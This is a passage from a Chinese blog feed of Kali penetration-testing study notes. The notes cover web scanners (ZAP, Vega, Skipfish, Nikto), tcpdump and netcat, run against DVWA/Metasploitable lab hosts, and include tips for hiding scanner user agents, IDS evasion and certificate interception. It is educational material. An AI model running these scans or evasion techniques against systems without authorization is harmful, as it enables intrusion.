        <tags>
            
            <tag> 黑客攻防web安全实战详解 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>kali渗透测试之Web渗透-扫描工具-QWASP_ZAP</title>
      <link href="/archis/b248361f/"/>
      <url>/archis/b248361f/</url>
      
        <content type="html"><![CDATA[<h1 id="kali渗透测试之Web渗透-扫描工具-QWASP-ZAP"><a href="#kali渗透测试之Web渗透-扫描工具-QWASP-ZAP" class="headerlink" title="kali渗透测试之Web渗透-扫描工具-QWASP_ZAP"></a>kali渗透测试之Web渗透-扫描工具-QWASP_ZAP</h1><p>扫描工具-QWASP_ZAP</p><p>十大安全工具之一，集成性工具，功能完善，而且强大。既可做主动扫描，也可做截断代理。开源免费跨平台，简单易用，体验相对混乱，但在主动扫描方面，相对占优。【kali集成】(主动扫描方面比burp好)</p><pre><code>####建议选择第二项####注意检查更新</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201711251642_866.jpg" alt=""></p><p>更新与插件安装</p><pre><code>安装插件release和beta【release：成熟版  beta：测试版  alpha：不成熟版】</code></pre><p>截断代理【结合手动爬网】</p><pre><code>默认情况下，代理功能自启动1、启动浏览器代理2、</code></pre><p>2、主动扫描</p><pre><code>一、快速爬网扫描二、直接扫描爬到的内容对于要身份认证才能访问的网页无法进行扫描，需要进行身份认证配置Fuzz二、</code></pre><p>结果分析：</p><pre><code>1、查看Code【200 OK】（）若为302，则是重定向2、查看Size Resp.Header是否不同</code></pre><p>暴力破解：</p><pre><code>API功能【程序接口】~http:/zap/【代理已经指向OWASP_ZAP】</code></pre><p>3、使用方法</p><pre><code>0、Persist Session1.四种模式Mode----safe&lt;protect&lt;standard&lt;ATTACK【小心选择扫描模式】2、升级add-ons3、Scan Profile（扫描策略）    右键-&gt;攻击-&gt;Active Scan    自定义扫描策略4、Anti CSRF Tokens【某些网站为了防止CSRF攻击，每次随机生成Tokens】5、扫描https网站时，出现证书报错，通过导入ssl证书，则不会出现错误6、Scope / Contexts（范围） / filter    #Scope  以相同的策略进行扫描（包含context）    #Contexts7、Http Sessions——default session tokens &amp; site session tokens    Session  Properties  #使用默认Manual已能满足大多数，失效再考虑下面#使用表单进行身份认证#脚本认证Script，需自己编写脚本【有脚本模版】#默认情况下，只认定指定的Session的名，必须手动添加其他Session【如：security】 #显示http Session tab    #用于使用不同用户登录审计，判断是否有越权8、Note / tag【添加各种标签，方便审计】9、Passive scan</code></pre><p>############################################################################################</p><p>#实时截断【注意截断时间，需快速】</p><pre><code>##返回的结果也会拦截</code></pre><p>#显示隐藏域</p><p>###隐藏域在客户端是为了降低客户端对服务端的请求过程，提高速度和用户体验。若服务端没对数据进行检验或检查，可进行价格修改和恶意代码注入等</p><pre><code>#被动扫描规则#爬网域值</code></pre><p>##########################################################################################</p><p>扫描标准流程</p><pre><code>设置代理手动爬网自动爬网     #强制浏览web服务器【有可能发现一些web目录】    #强制目录浏览、强制目录和子目录爬网【有各自的字典】主动扫描【active scan】</code></pre>]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
      </categories>
      
      
        <tags>
            
            <tag> QWASP_ZAP </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>kali渗透测试之Web渗透-扫描工具-Vega</title>
      <link href="/archis/136af25a/"/>
      <url>/archis/136af25a/</url>
      
        <content type="html"><![CDATA[<h1 id="kali渗透测试之Web渗透-扫描工具-Vega"><a href="#kali渗透测试之Web渗透-扫描工具-Vega" class="headerlink" title="kali渗透测试之Web渗透-扫描工具-Vega"></a>kali渗透测试之Web渗透-扫描工具-Vega</h1><p>##任务6： WEB扫描工具-Vega</p><p> 纯图形化界面，Java编写的开源web扫描器。两种工作模式：扫描模式和代理模式【主流扫描功能】。用于爬站。处理表单，注入测试等。支持SSL：<a href="http://vega/ca.crt" target="_blank" rel="external">http://vega/ca.crt</a></p><p>专注于应用程序代码方面的漏洞</p><p>Vega<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201711251348_627.jpg" alt=""></p><pre><code>#基于字典发现网站目录</code></pre><p>代理模式</p><p>被动收集信息，结合手动爬站【即页面中能点击的链接全部点击一遍，能提交数据的地方，全部提交一遍】</p><p>连接到网站外面的链接可以暂时不用管<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201711251349_64.jpg" alt=""></p><pre><code>#设置外部代理服务器</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201711251349_630.jpg" alt=""></p><pre><code>#删除user-agent尾部的vega字样</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201711251349_272.jpg" alt=""></p><pre><code>#设置代理</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201711251349_285.jpg" alt=""></p><pre><code>1、setup重置【方便用户初始安装和配置】设置安装完成后，一定要删掉，不能留在服务器。如果权限设置不当，通过非授权访问到，可篡改数据库内容</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201711251350_130.jpg" alt=""></p><pre><code>2、提交数据【随便输入，目的：被Vega抓取数据】</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201711251350_567.jpg" alt=""></p><pre><code>3、URL【?参数=***】在等号后面的值，添加不正常的内容，看返回结果4、view source【服务器端源代码，正常Web application中没有此功能，只为了分析漏洞而提供的功能】5、上传位置【同理：成功与否，无所谓】6、反射性XSS【输入什么内容，就返回什么内容】7、论坛或收集反馈的典型表单页面【】8、phpinfo  #安装PHP后，测试是否能否正常工作 【泄漏大量服务器配置信息】#左边灰白色为页面中存在的链接</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201711251350_798.jpg" alt=""></p><pre><code>#部分扫描结果</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201711251350_220.jpg" alt=""></p><pre><code>9、事后操作-修改内容重放【在时间失效之前】</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201711251351_991.jpg" alt=""></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201711251351_491.jpg" alt=""></p><pre><code>截断功能【代理方面有所欠缺】</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201711251351_90.jpg" alt=""><br>扫描模式【切换】</p><pre><code>vega主动，对页面中的内容、参数进行扫描</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201711251351_475.jpg" alt=""></p><pre><code>配置1、准备     #定义身份认证信息    1、basic http authentication    #http基本身份认证    2、digest http authentication   #http摘要身份认证    3、NTLM                                 #windows系统账号密码认证【未加入域】    4、macro                                 #基于表单【大部分web应用身份认证】</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201711251351_2.jpg" alt=""></p><pre><code>        #创建宏</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201711251352_704.jpg" alt=""></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201711251352_133.jpg" alt=""></p><pre><code>2、开始</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201711251352_828.jpg" alt=""></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201711251352_280.jpg" alt=""><br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201711251352_318.jpg" alt=""></p><pre><code>#查看详细信息console</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201711251352_31.jpg" alt=""></p><pre><code>#请求内容的过程</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201711251352_181.jpg" alt=""></p><p>https证书加密网站【即其既是一个服务网站，又是一个可信证书颁发机构】的扫描【截断代理】</p><pre><code>签名证书：由权威颁发机构颁发给服务器或者个人用于证明自己身份的东西，默认客户端都是信任的。主要目的是用来加密和保证数据的完整性和不可抵赖性自签名证书：由服务器自己颁发给自己，用于证明自己身份的东西，非权威颁发机构发布，默认客户端都是不信任的，主要目的是用来加密和保证数据的完整性和不可抵赖性,与签名证书相同.创建自签名SSL证书：http://www.cnblogs.com/lihuang/articles/4205540.html也是类似，通过vega作为代理服务器，伪造证书，进行信息劫持，进行但要注意：####当访问网站出现信任报错时，可能是有人伪造了证书【如：百度号称全站https，淘宝、阿里、facebook】查看证书</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201711251353_9.jpg" alt=""></p><pre><code>#右键 View Page info</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201711251353_884.jpg" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vega </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>kali渗透测试之Web渗透-扫描工具-Skipfish</title>
      <link href="/archis/497d64c3/"/>
      <url>/archis/497d64c3/</url>
      
        <content type="html"><![CDATA[<h1 id="kali渗透测试之Web渗透-扫描工具-Skipfish"><a href="#kali渗透测试之Web渗透-扫描工具-Skipfish" class="headerlink" title="kali渗透测试之Web渗透-扫描工具-Skipfish"></a>kali渗透测试之Web渗透-扫描工具-Skipfish</h1><h2 id="任务8：-skipfish"><a href="#任务8：-skipfish" class="headerlink" title="任务8： skipfish"></a>任务8： skipfish</h2><p>Skipfish是一个命令行模式，以C语言编写的积极的Web应用程序的安全性侦察工具，没有代理模式。 它准备了一个互动为目标的网站的站点地图进行一个递归爬网和基于字典的探头。</p><pre><code>优点：速度比较快【多路单线程，全异步网络I/O，消除内存管理和调度开销，支持启发式自动内容识别】，误报相对低</code></pre><p>使用方式：【<a href="https://my.oschina.net/u/995648/blog/114321】" target="_blank" rel="external">https://my.oschina.net/u/995648/blog/114321】</a></p><pre><code>基本命令使用方式    skipfish -o test http:1.1.1.1   #指定输出目录/路径    #ctrl -c   停止    #空格     显示详细信息</code></pre><p>skipfish -o test http:192.168.57.143/dvwa/<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201711251434_19.png" alt=""><br>打开根目录下的skipfishtest1/index.html文件即可查看详细信息</p><pre><code>    skipfish -o test @url.txt             #字典文件</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201711251439_346.png" alt=""><br>        skipfish -o test -S complet.wl -Wa.wl <a href="http://1.1.1.1" target="_blank" rel="external">http://1.1.1.1</a>   #指定集成参数字典，发现隐藏目录</p><pre><code>        #dpkg -L skipfish | grep wl</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201711251458_169.png" alt=""></p><pre><code>-I （i）：只检查包含‘string’的URL     【适用于大型网站】    skipfish -o test1 -I /dvwa/ http://192.168.57.143/dvwa/-X：不检查包含‘string’的URL   【如：logout】-K：不对指定参数进行fuzz测试-D：跨站点爬另一个域【即目标页面中有另一个域名，则进行扫描】-l：每秒最大请求数-m：每IP最大并发连接数【依据带宽】--config：指定配置文件 【将参数命令写入一个配置文件】</code></pre><p>身份认证【在一种方式不成功的情况下，使用其他方式】</p><pre><code>    skipfish -A user:pass -o test http://1.1.1.1    #基本http身份认证    skipfish  -C &quot;PHPSESSID=&quot; -C &quot;security=&quot; -o test http://1.1.1.1   #</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201711251505_541.png" alt=""><br>       基于cookie</p><pre><code>    Usename / Password                           #直接提交表单        ep：skipfish -o a --auth-form http://192.168.1.109/dvwa/login.php --auth-form-target http://192.168.1.109/dvwa/login.php   --auth-user-filed usename --auth-user admin -auth-pass-filed password -auth-pass password --auth-verify-url http://192.168.1.109/dvwa/index.php -I /dvwa/ http://192.168.1.109/dvwa/</code></pre>]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Skipfish </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>kali渗透测试之Web渗透-扫描工具-Nikto</title>
      <link href="/archis/a04b3dd7/"/>
      <url>/archis/a04b3dd7/</url>
      
        <content type="html"><![CDATA[<h1 id="kali渗透测试之Web渗透-扫描工具-Nikto"><a href="#kali渗透测试之Web渗透-扫描工具-Nikto" class="headerlink" title="kali渗透测试之Web渗透-扫描工具-Nikto"></a>kali渗透测试之Web渗透-扫描工具-Nikto</h1><h2 id="任务4：实验环境Metasploaitable和侦察HTTRACK"><a href="#任务4：实验环境Metasploaitable和侦察HTTRACK" class="headerlink" title="任务4：实验环境Metasploaitable和侦察HTTRACK"></a>任务4：实验环境Metasploaitable和侦察HTTRACK</h2><p>httrack 克隆一个网站页面到本地<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201711231143_886.png" alt=""><br>mkdir dvwa 创建一个目录<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201711231145_468.png" alt=""></p><p>侦察【减少与目标系统交互】</p><pre><code>Httrack：将WEB可下载的页面下载到本机，再进行本地检查【kali下安装】##可到此网站获取代理：hidemyass.com【免费代理需小心】</code></pre><h2 id="任务5：扫描工具-Nikto"><a href="#任务5：扫描工具-Nikto" class="headerlink" title="任务5：扫描工具-Nikto"></a>任务5：扫描工具-Nikto</h2><p>基于WEB的扫描工具，基本都支持两种扫描模式。代理截断模式，<strong>主动扫描模式</strong></p><p>手动扫描：作为用户操作发现页面存在的问题，但可能会存在遗漏</p><p>自动扫描：基于字典，提高速度，但存在误报和触发警告</p><p>参考书：Web_Penetration_Testing_with_Kali_Linux</p><p>Nikto【纯主动型】<br>   Nikto 是一款Perl语言开发的开源代码的、功能强大的WEB扫描评估软件，能对web服务器多种安全项目进行测试的扫描软件。<br>扫描内容：</p><pre><code>1、软件版本2、搜索存在安全隐患的文件【如：某些web维护人员备份完后，遗留的压缩包，若被下载下来，则获得网站源码】3、服务器配置漏洞【组件可能存在默认配置】    4、WEB Application层面的安全隐患【xss，SQL注入等】    5、避免404误判        ·很多服务器不遵守RFC标准，对于不存在的对象返回200响应码        ·依据响应文件内容判断，不同扩展名【jsp、cji】的文件404响应内容不同        ·去除时间信息后的内容取MD5值        ·参数：-no404【不进行误判尝试判断，可能存在误判】</code></pre><p>命令详解：</p><pre><code>nikto 主要参数man nikto 更多参数nikto -update   #直接更新数据库，厂商网址可能被墙 【在此网站可下载最新版http://cirt.net/nikto/UPDATES/】nikto  -list-plugins       #插件列表</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201711251346_435.jpg" alt=""></p><pre><code>nikto -host http://1.1.1.1 （目标）nikto -host 192.168.1.1 -ssl -port 443,8443,995 扫描端口例如：nikto -host www.baidu.com -port 443 -sslssl即https的端口默认为443</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201711041704_648.png" alt=""></p><p>nikto -host <a href="http://192.168.1.109/dvwa/" target="_blank" rel="external">http://192.168.1.109/dvwa/</a>           #指定网站目录扫描</p><pre><code>nikto -host 192.168.1.1.109 -port 80,443      #可指定多个端口【加-output：输出结果】nikto -host host.txt   #扫描多个IPnmap -p80 192.168.1.0/24 -oG - | nikto -host -        #结合nmap，对一个网段内开放了80端口的主机进行扫描 nikto -host https://www.baidu.com -useproxy http://localhost:8087     #使用代理-vhost  【+域名】   #虚拟IP，区分网站【使用背景：一个ip对应多个网站】</code></pre><p>交互性参数【用于扫描过程中】</p><pre><code>回车：报告当前状态v：正在扫描的详细信息（路径，结果等）#再按v就停止d：极其详细的信息，包括传strong text输内容     #e：错误信息                                    #p：显示进度                               #r：重定向                                   #c：cookiea：身份认证q：退出N：下一个主机（用于多个IP）P：暂停</code></pre><p>nikto配置文件【大部分需要登录进网站，才能进行扫描】</p><pre><code>    -id+    #使用http身份认证【但现在很少】支持指定cookie    vi /etv/nikto.conf</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201711251338_899.jpg" alt=""></p><pre><code>    #修改useagent【默认配置，容易被管理员发现】    USERAGENT=Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201711251345_604.jpg" alt=""></p><pre><code>    #抓包分析，获取cookie</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201711251345_197.jpg" alt=""></p><pre><code>    #修改cookie信息【让nikto获得身份认证，进行进一步扫描】</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201711251345_949.jpg" alt=""></p><pre><code>    -evasion：使用LibWhisker中对IDS的逃避技术，可使用以下几种类型    1、随机URL编码（非UTF-8方式）    2、自选路径（/./）    3、过早结束的URL    4、优先考虑长随机字符串    5、参数欺骗    6、使用TAB作为命令的分隔符    7、使用变化的URL    8、使用windows路径分隔符”\“</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201711251345_7.jpg" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Nikto </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>kali渗透测试之Web渗透-工具-TCPDUMP</title>
      <link href="/archis/2b646ba1/"/>
      <url>/archis/2b646ba1/</url>
      
        <content type="html"><![CDATA[<p>#kali渗透测试之Web渗透-工具-TCPDUMP</p><h2 id="TCPDUMP-抓包、筛选、高级筛选、过程文档记录"><a href="#TCPDUMP-抓包、筛选、高级筛选、过程文档记录" class="headerlink" title="TCPDUMP-抓包、筛选、高级筛选、过程文档记录"></a>TCPDUMP-抓包、筛选、高级筛选、过程文档记录</h2><p>TCPDUMP</p><p>  No-GUI的抓包分析工具</p><p>  Linux、Unix系统默认安装</p><h3 id="TCPdump—–抓包"><a href="#TCPdump—–抓包" class="headerlink" title="TCPdump—–抓包"></a>TCPdump—–抓包</h3><p>抓包</p><p>  默认只抓68个字节</p><p>  指定端口 -s0指定包有多大就抓多大<br>  tcpdump -i eth0 -s 0 -w file.pcap</p><p>  tcpdump -i eth0 port 22</p><p>读取抓包文件</p><p>  Tcpdump -r file.pcap</p><h3 id="选项介绍"><a href="#选项介绍" class="headerlink" title="选项介绍"></a>选项介绍</h3><p>-A 以ASCII格式打印出所有分组，并将链路层的头最小化。 </p><p>-c 在收到指定的数量的分组后，tcpdump就会停止。 </p><p>-C 在将一个原始分组写入文件之前，检查文件当前的大小是否超过了参数file_size 中指定的大小。如果超过了指定大小，则关闭当前文件，然后在打开一个新的文件。参数 file_size 的单位是兆字节（是1,000,000字节，而不是1,048,576字节）。 </p><p>-d 将匹配信息包的代码以人们能够理解的汇编格式给出。 </p><p>-dd 将匹配信息包的代码以c语言程序段的格式给出。 </p><p>-ddd 将匹配信息包的代码以十进制的形式给出。 </p><p>-D 打印出系统中所有可以用tcpdump截包的网络接口。 </p><p>-e 在输出行打印出数据链路层的头部信息。 </p><p>-E 用spi@ipaddr algo:secret解密那些以addr作为地址，并且包含了安全参数索引值spi的IPsec ESP分组。 </p><p>-f 将外部的Internet地址以数字的形式打印出来。 </p><p>-F 从指定的文件中读取表达式，忽略命令行中给出的表达式。 </p><p>-i 指定监听的网络接口。 </p><p>-l 使标准输出变为缓冲行形式，可以把数据导出到文件。 </p><p>-L 列出网络接口的已知数据链路。 </p><p>-m 从文件module中导入SMI MIB模块定义。该参数可以被使用多次，以导入多个MIB模块。 </p><p>-M 如果tcp报文中存在TCP-MD5选项，则需要用secret作为共享的验证码用于验证TCP-MD5选选项摘要（详情可参考RFC 2385）。 </p><p>-b 在数据-链路层上选择协议，包括ip、arp、rarp、ipx都是这一层的。</p><p>-n 不把网络地址转换成名字。</p><p>-nn 不进行端口名称的转换。</p><p>-N 不输出主机名中的域名部分。例如，‘nic.ddn.mil‘只输出’nic‘。 </p><p>-t 在输出的每一行不打印时间戳。 </p><p>-O 不运行分组分组匹配（packet-matching）代码优化程序。 </p><p>-P 不将网络接口设置成混杂模式。 </p><p>-q 快速输出。只输出较少的协议信息。 </p><p>-r 从指定的文件中读取包(这些包一般通过-w选项产生)。 </p><p>-S 将tcp的序列号以绝对值形式输出，而不是相对值。 </p><p>-s 从每个分组中读取最开始的snaplen个字节，而不是默认的68个字节。 </p><p>-T 将监听到的包直接解释为指定的类型的报文，常见的类型有rpc远程过程调用）和snmp（简单网络管理协议；）。 </p><p>-t 不在每一行中输出时间戳。 </p><p>-tt 在每一行中输出非格式化的时间戳。 </p><p>-ttt 输出本行和前面一行之间的时间差。 </p><p>-tttt 在每一行中输出由date处理的默认格式的时间戳。 </p><p>-u 输出未解码的NFS句柄。 </p><p>-v 输出一个稍微详细的信息，例如在ip包中可以包括ttl和服务类型的信息。 </p><p>-vv 输出详细的报文信息。 </p><p>-w 直接将分组写入文件中，而不是不分析并打印出来。</p><p>root:～# tcpdump -h          </p><pre><code> enter code heretcpdump version 4.3.0libpcap version 1.3.0Usage: tcpdump [-aAbdDefhHIJKlLnNOpqRStuUvxX] [ -B size ] [ -c count ][ -C file_size ] [ -E algo:secret ] [ -F file ] [ -G seconds]             [ -i interface ] [ -j tstamptype ] [ -M secret ]             [ -r file ] [ -s snaplen ] [ -T type ] [ -w file ]             [ -W filecount ] [ -y datalinktype] [ -z command ]             [ -Z user ] [ expression ]</code></pre><p>root:～# tcpdump -i eth0 -s 0 -w a.cap     //监听网络接口字节为0保存到a.cap文件中</p><p>tcpdump: listening on eth0, link-type EN10MB(Ethernet), capture size 65535 bytes</p><p>^C15 packets captured</p><p>15 packets receiced by filter</p><p>0 packets drodded by kernel</p><p>root:～# tcpdump -r a.cap                  //读取a.cap文件内容</p><p>root:～# tcpdump -A -r a.cap               //以ASCII格式打印出所有的分组并且读取此文件</p><p>root:～# tcpdump -X -r a.cap               //以十六进制格式打印出所有的分组并且读取此文件</p><p>root:～# tcpdump -i eth0 tcp port 22</p><p>TCPDUMP——筛选</p><p>  tcpdump -n -r http.cap | awk ‘{print $3}’| sort -u</p><p>  tcpdump -n src host 145.254.160.237 -r http.cap</p><p>  tcpdump -n dst host 145.254.160.237 -r http.cap</p><p>  tcpdump -n port 53 -r http.cap</p><p>  tcpdump -nX port 80 -r http.cap</p><p>root:～/Downloads# tcpdump -n -r http.cap | awk ‘{print $3}’| sort -u</p><p>reading from file http.cap, link type En10MB(Ethernet)</p><p>145.253.2.203.53</p><p>145.254.160.237.3009</p><p>145.254.160.237.3371</p><p>145.254.160.237.3372</p><p>216.239.59.99.80</p><p>65.208.228.223.80</p><p>0                  1                    2                   3</p><p>0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1</p><p>+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</p><p>|          Source Port          |     Destination Port          |       </p><p>+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</p><p>|                        Sequence Number                        |         </p><p>+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</p><p>|                      Acknowledgment Nuber                     |         </p><p>+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</p><p>|  Date  |      |C|E|U|A|P|R|A|F|                               |</p><p>| Offset |  Res.|W|C|R|C|S|S|Y|I|         Windwos               |</p><p>|        |      |R|E|G|K|H|T|N|N|                               |         </p><p>+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</p><p>|            Checksum           |     Urgent Pointer            |         </p><p>+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</p><p>|                      Options               |     Padding      |         </p><p>+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</p><p>|                                data                           |          </p><p>+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</p><p>CEUAPRSF</p><p>00011000 = 24 in decimal</p><p>TCPDUMP——高级筛选</p><p>  tcpdump -A -n ‘tcp[13]=24’ -r http.cap</p><p>过程文档记录</p><p>  Dradis</p><pre><code>短期临时小团队资源共享各种插件导入文件</code></pre><p>  keepnote</p><p>  Truecrypt</p><p>应用程序—–&gt;报告工具库—–&gt;Documentation—–&gt;dradis</p><p>应用程序—–&gt;Office—–&gt;KeepNote</p><p>New Notebook</p><p>新建一个keepnote</p><p>TrueCrypt，是一款免费开源的加密软件，同时支持Windows Vista,7/XP, Mac OS X, Linux 等操作系统。TrueCrypt不需要生成任何文件即可在硬盘上建立虚拟磁盘，用户可以按照盘符进行访问，所有虚拟磁盘上的文件都被自动加密，需要通过密码来进行访问。TrueCrypt 提供多种加密算法，包括：AES-256, Blowfish (448-bit key), CAST5, Serpent, Triple DES, and Twofish，其他特性还有支持FAT32和NTFS分区、隐藏卷标、热键启动等。</p>]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TCPDUMP </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>kali渗透测试之Web渗透-工具-NETCAT</title>
      <link href="/archis/32be69d6/"/>
      <url>/archis/32be69d6/</url>
      
        <content type="html"><![CDATA[<p>#kali渗透测试之Web渗透-工具-NETCAT</p><p>##NETCAT(传输文件/目录、流媒体服务、端口扫描、远程克隆硬盘)<br>网络工具中的瑞士军刀——小身材、大智慧<br>侦听模式/传输模式<br>telnet/获取banner信息<br>传输文本信息<br>传输文件目录<br>加密传输文件<br>远程控制/木马<br>加密所有流量<br>流媒体服务器<br>远程克隆硬盘</p><h3 id="NC—–TELNET-banner"><a href="#NC—–TELNET-banner" class="headerlink" title="NC—–TELNET/banner"></a>NC—–TELNET/banner</h3><p>nc -nv 1.1.1.1 10<br>nc -nv 1.1.1.1 25<br>nc -nv 1.1.1.1 80<br>root:~# nc -h               //它的基本用法<br> root:~# nc -v               //端口扫描<br>root:~# mtr 200.106.0.20    //追踪一下路由<br>root:~# nc -vn              //显示详细的终端信息，不会Dns解析<br>root:~# ping pop3. 163.com<br>//连接ip邮箱（客户端链接服务器端）<br>root:~# nc -vn 123.125.50.29 110<br>USER<br>USER 12asdfg<br>USER ZmfuZZhvbmcueXVhbkAxNjMuY29tCg==</p><p>root:~# base64<br>fanghong.yuan@163.com<br>（按ctrl+d邮箱编码成：ZmfuZZhvbmcueXVhbkAxNjMuY29tCg==）</p><p>root:~# ping smtp.163.com</p><p>root:~# nc -nv 123.125.20.138 25</p><pre><code>220 163.com Anti-spam GT for Coremail System(163com[20141201])ehlo500 Errot: bad syntaxehlo yuanfh250-mail250-PIPELINING250-AUTH LOGIN PLAIN250-AUTH=LOGIN PLAIN250-coremail 1uxr2xKj7G0xkI17xGrU710s8FY2U3Uj8Cz8x1UUUUU7Ic2IOY2Urz03NIUCa0xDrUUUUj250-ARARTTLS250 8BIMIMEAUTH LOGIN344 dxNLcm5hbWU6fanghong.yuan@163.com535 Error: authentication failed</code></pre><p>root:~# nc -nv 123.125.20.138 25</p><pre><code>220 163.com Anti-spam GT for Coremail System(163com[20141201])ehlo500 Errot: bad syntaxehlo yuanfh250-mail250-PIPELINING250-AUTH LOGIN PLAIN250-AUTH=LOGIN PLAIN250-coremail 1uxr2xKj7G0xkI17xGrU710s8FY2U3Uj8Cz8x1UUUUU7Ic2IOY2Urz03NIUCa0xDrUUUUj250-ARARTTLS250 8BIMIMEAUTH LOGIN344 dxNLcm5hbWU6&lt;fanghong.yuan@163.com&gt;535 Error: authentication failed</code></pre><p>root:~# nc -nv 10.1.1.11 80</p><pre><code>(UNKNOWN) [10.1.1.11] 80 (http) openhead /&lt;html&gt;&lt;head&gt;&lt;titile&gt;Metasploitable2 - Linux&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;warning: Never expose this VM to an untrusted network!Contact: msfdev[at]metasploit.comLogin with msfadmin/msfadmin to get started&lt;/pre&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;/twiki/&quot;&gt;Twiki&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/phpMyAdmin/&quot;&gt;phpMyAdmin&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/mutillidae/&quot;&gt;Mutillidae&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/dvwa/&quot;&gt;DVWA&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/dav/&quot;&gt;wevDAV&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="NC—–传输文本信息"><a href="#NC—–传输文本信息" class="headerlink" title="NC—–传输文本信息"></a>NC—–传输文本信息</h3><p>A: nc -l -p 4444</p><p>B: nc -nv 1.1.1.1 4444</p><p>远程电子取证信息收集</p><p>开启两台系统kalix64和kalix32</p><p>kali 32Bit</p><p>root@kali:~# nc -l -p 333       //打开端口333</p><p>root@kali:~# netstat -pantu | grep 333     //查看端口33是否打开<br>ifconfig查看地址：10.1.1.12<br>kali 64Bit</p><p>root:~# nc -nv 10.1.1.12 333</p><p>(UNKNOWN) [10.1.1.12] 333 (?) open<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201802271914_628.png" 